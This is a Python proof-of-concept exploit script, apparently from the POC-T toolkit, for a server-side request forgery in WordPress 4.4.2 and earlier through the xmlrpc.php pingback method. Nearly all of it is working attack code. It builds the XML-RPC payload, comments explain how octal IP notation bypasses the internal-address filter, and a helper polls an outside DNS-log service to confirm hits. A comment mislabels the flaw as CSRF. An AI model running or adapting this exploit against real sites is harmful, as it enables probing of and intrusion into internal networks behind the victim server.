#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
WordPress 4.4 Server Side Request Forgery (SSRF)

Version
  WordPress <= 4.4.2

"""

import requests

req_timeout = 10

def check_dns_log(hashstr):
    url = 'http://admin.dnslog.link/api/web/0e9cd982/{}/'.format(hashstr)
    r = requests.get(url)
    return r.text


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    targeturl = url.rstrip('/') + "/xmlrpc.php"

    hashstr = 'wpssrf'
    # dst = hashstr + '.0e9cd982.dnslog.link'
    dst = '012.10.10.1'

    # 第一个地址段为SSRF的目标地址，格式为(http[s]://IP|DOAMIN)[:(80|8080|443)]。
    # 只能这三个端口，外网地址全通，内网地址被过滤，可用8进制突破10开头的地址段。
    # 第二个地址段需要该站实际存在的文章地址，用?p=1自动适配。
    payload = """
        <?xml version="1.0" encoding="iso-8859-1"?>
        <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
        <param><value><string>http://{target}/</string></value></param>
        <param><value><string>{victim}?p=1</string></value></param>
        </params>
        </methodCall>""".format(target=dst, victim=url.rstrip('/') + '/')

    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
              'Content-Type': 'text/xml'}
    try:
        # 无法从回显判断
        res = requests.post(targeturl, data=payload, headers=header, timeout=req_timeout)
        print res.text
        # res = check_dns_log(hashstr)
        # if res:
        #     print '[!] 存在 CSRF 漏洞：{}'.format(url)
        #     return True
    except Exception, e:
        pass
    return False

if __name__ == '__main__':
    # poc('http://localhost/wordpress/wordpress-4.4.2/wordpress/')
    poc('http://localhost/wordpress/wordpress-4.2-zh_CN/wordpress/')

